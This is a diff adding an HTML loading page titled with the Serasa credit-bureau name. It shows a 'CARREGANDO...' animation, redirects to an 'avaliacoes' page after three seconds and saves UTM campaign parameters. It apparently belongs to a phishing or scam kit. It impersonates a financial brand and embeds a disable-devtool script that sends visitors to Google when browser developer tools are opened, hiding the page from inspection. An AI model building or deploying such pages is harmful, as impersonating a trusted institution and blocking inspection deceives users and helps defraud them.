@@ -1,0 +1,83 @@
+<html lang="pt-BR"><head></head><body class="fundo1" onload="setTimeout('redirectTime()', 3000)">﻿
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link data-optimized="1" rel="stylesheet" href="css/7WEv4nXPFNyZ.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com/">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+        <link data-optimized="1" href="css/Gxj4x9mWYW94.css" rel="stylesheet">
+        <link data-optimized="1" href="css/CHmFK65jmuGZ.css" rel="stylesheet">
+        <link rel="stylesheet" href="css/w4DWX6jiztbC.css">
+        <link rel="stylesheet" href="css/13ZfgJ6OdBwL.css">
+        <link rel="shortcut icon" href="images/SrX1jmqVXQIF.png">
+        <title>:: Serasa ::</title>
+    
+
+    
+
+
+
+        <div style="width: 107%; position: absolute; top: 8%; left: 50%; transform: translate(-50%, -50%);" id="p1">
+       
+            <img style="position: absolute; left: 0;" src="images/gTR33P6DhxYI.gif">
+
+            <div style="display: flex; margin-top: 60px; justify-content: space-evenly;">
+                <h1 class="" style="width: 20px; height: 20px;"></h1>
+                <h1 class="carregandoCodigo">CARREGANDO...</h1>
+            </div>
+
+        </div>
+
+        <script src="js/1p009LOrAYGv.js"></script>
+        <script src="js/iClcu2HbOzqk.js"></script>
+        <script disable-devtool-auto="" src="disable-devtool.html" url="https://google.com.br"></script>
+        <script>
+            // REDIRECIONAMENTO LOADING
+            function redirectTime(){
+                window.location = "../avaliacoes/index.html"
+            }
+            // REDIRECIONAMENTO LOADING
+
+            
+
+
+
+
+
+
+
+            // Função para extrair os parâmetros UTM da URL
+            function getUTMParameters() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmParameters = ['utm_source', 'utm_campaign', 'utm_term', 'utm_content', 'utm_medium'];
+                let utmData = {};
+
+                utmParameters.forEach(param => {
+                    if (urlParams.has(param)) {
+                        utmData[param] = urlParams.get(param);
+                    }
+                });
+
+                return utmData;
+            }
+
+            // Função para salvar os dados UTM no Local Storage
+            function saveUTMDataToLocalStorage(utmData) {
+                for (const [key, value] of Object.entries(utmData)) {
+                    localStorage.setItem(key, value);
+                }
+            }
+
+            // Extrair e salvar os dados UTM
+            const utmData = getUTMParameters();
+            if (Object.keys(utmData).length > 0) {
+                saveUTMDataToLocalStorage(utmData);
+                console.log('Dados UTM salvos no Local Storage:', utmData);
+            } else {
+                console.log('Nenhum parâmetro UTM encontrado na URL.');
+            }
+
+        </script>
+
+    
+</body></html>
